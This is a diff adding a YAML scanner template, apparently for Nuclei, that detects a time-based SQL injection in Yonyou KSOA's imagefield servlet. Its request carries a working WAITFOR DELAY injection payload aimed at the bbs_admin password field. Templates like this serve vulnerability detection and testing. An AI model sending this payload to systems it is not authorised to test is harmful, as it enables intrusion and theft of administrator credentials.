@@ -1,0 +1,28 @@
+id: poc-yaml-yysk-KSOA-imagefield-SQL-injection
+info:
+  name: 用友时空 KSOA imagefield SQL 注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    用友时空 KSOA contains an imagefield SQL injection vulnerability that can be exploited to retrieve sensitive data or execute arbitrary SQL commands.
+
+variables:
+  delay_time: '{{rand_int(5,10)}}'
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27;WAITFOR%20DELAY%20%270:0:{{delay_time}}%27--'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'content_type == "image/jpeg"'
+          - 'duration > delay_time'
+      - type: word
+        words:
+          - ""
